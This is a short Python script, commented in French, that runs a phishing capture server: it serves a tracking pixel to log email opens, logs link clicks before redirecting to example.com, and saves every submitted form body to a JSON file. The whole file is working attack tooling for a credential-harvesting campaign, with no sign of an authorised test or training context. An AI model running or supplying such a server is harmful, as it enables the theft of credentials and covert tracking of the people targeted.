# -*- coding: utf-8 -*-
# Serveur de capture phishing : pixel + formulaire + redirection
import http.server
import socketserver
import json
import os
import urllib.parse
from datetime import datetime

PORT = 8080
CAPTURE_DIR = "output"
os.makedirs(CAPTURE_DIR, exist_ok=True)

PIXEL = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00"
         b"\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,"
         b"\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")

def log_event(kind, data):
    # Journalisation des evenements
    path = os.path.join(CAPTURE_DIR, "phishing_events.json")
    events = []
    if os.path.exists(path):
        with open(path) as f:
            events = json.load(f)
    events.append({"kind": kind, "data": data,
                   "ts": datetime.now().isoformat()})
    with open(path, "w") as f:
        json.dump(events, f, indent=2)

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Pixel de tracking
        if self.path.startswith("/pixel"):
            log_event("open", self.path)
            self.send_response(200)
            self.send_header("Content-Type", "image/gif")
            self.end_headers()
            self.wfile.write(PIXEL)
            return
        # Redirection avec capture d'ID
        if self.path.startswith("/capture"):
            log_event("click", self.path)
            self.send_response(302)
            self.send_header("Location", "https://example.com")
            self.end_headers()
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        # Capture de formulaire
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="ignore")
        log_event("submit", {"path": self.path,
                             "body": urllib.parse.parse_qs(body)})
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"[+] Serveur phishing sur port {PORT}")
        httpd.serve_forever()